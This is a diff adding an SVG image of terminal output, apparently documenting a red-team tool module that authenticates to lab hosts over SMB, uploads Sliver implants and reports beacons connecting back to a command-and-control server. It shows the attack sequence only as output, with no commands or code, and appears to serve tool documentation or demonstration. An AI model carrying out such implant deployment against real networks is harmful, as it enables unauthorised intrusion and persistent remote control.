@@ -1,0 +1,24 @@
+<svg width="1100" height="240" xmlns="http://www.w3.org/2000/svg">
+<foreignObject width="1100" height="240">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+<div style="background-color: black;">
+<pre style="font-weight: normal; color: #bbb; white-space: pre-wrap; word-wrap: break-word; overflow-wrap: break-word; background-color: inherit;"><b style="color: #5555ff; font-weight: normal;">SMB</b>         10.2.10.10      445    SQL01            <b style="color: #5555ff; font-weight: normal;">[*]</b> Windows Server 2022 Build 20348 x64 (name:SQL01) (domain:SQL01) (<b style="color: #ff5555; font-weight: normal;">signing:False</b>) (<b style="color: #55ffff; font-weight: normal;">SMBv1:None</b>)
+<b style="color: #5555ff; font-weight: ">SMB</b>         10.2.10.12      445    LINUX01          <b style="color: #5555ff; font-weight: normal;">[*]</b> Unix - Samba (name:LINUX01) (domain:LINUX01) (<b style="color: #ff5555; font-weight: normal;">signing:False</b>) (<b style="color: #55ffff; font-weight: normal;">SMBv1:None</b>)<b style="color: #ffff55; font-weight: normal;"> (Null Auth:True)</b>
+<b style="color: #5555ff; font-weight: normal;">SMB</b>         10.2.10.11      445    DEV01            <b style="color: #5555ff; font-weight: normal;">[*]</b> Windows Server 2022 Build 20348 x64 (name:DEV01) (domain:DEV01) (<b style="color: #ff5555; font-weight: normal;">signing:False</b>) (<b style="color: #55ffff; font-weight: normal;">SMBv1:None</b>)
+<b style="color: #5555ff; font-weight: normal;">SMB</b>         10.2.10.10      445    SQL01            <b style="color: #55ff55; font-weight: normal;">[+]</b> SQL01\localuser:password <b style="color: #ffff55; font-weight: normal;">(Pwn3d!)</b>
+<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.10      445    SQL01            <b style="color: #5555ff; font-weight: normal;">[*]</b> Generating Sliver windows/amd64 executable...
+<b style="color: #5555ff; font-weight: normal;">SMB</b>         10.2.10.12      445    LINUX01          <b style="color: #55ff55; font-weight: normal;">[+]</b> LINUX01\localuser:password 
+<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.12      445    LINUX01          <b style="color: #5555ff; font-weight: normal;">[*]</b> Generating Sliver linux/386 executable...
+<b style="color: #5555ff; font-weight: normal;">SMB</b>         10.2.10.11      445    DEV01            <b style="color: #55ff55; font-weight: normal;">[+]</b> DEV01\localuser:password <b style="color: #ffff55; font-weight: normal;">(Pwn3d!)</b>
+<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.11      445    DEV01            <b style="color: #5555ff; font-weight: normal;">[*]</b> Generating Sliver windows/amd64 executable...
+<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.12      445    LINUX01          <b style="color: #55ff55; font-weight: normal;">[+]</b> Implant SMB upload complete
+<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.12      445    LINUX01          <b style="color: #ff5555; font-weight: normal;">[-]</b> SMB execute is not supported on Linux targets; skipping remote execution
+<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.10      445    SQL01            <b style="color: #55ff55; font-weight: normal;">[+]</b> Implant SMB upload complete
+<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.11      445    DEV01            <b style="color: #55ff55; font-weight: normal;">[+]</b> Implant SMB upload complete
+<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.10      445    SQL01            <b style="color: #55ff55; font-weight: normal;">[+]</b> Beacon connected! ID: 0eabc91c-5584-4012-8d17-c15db38e4c02, Name: implant_ntsn4nkd.exe
+<b style="color: #55ffff; font-weight: normal;">SLIVER_EXEC</b> 10.2.10.11      445    DEV01            <b style="color: #55ff55; font-weight: normal;">[+]</b> Beacon connected! ID: 634bbc69-7b64-4d1b-abf0-4341c394a986, Name: implant_ck2p210f.exe
+</pre>
+</div>
+    </div>
+</foreignObject>
+</svg>
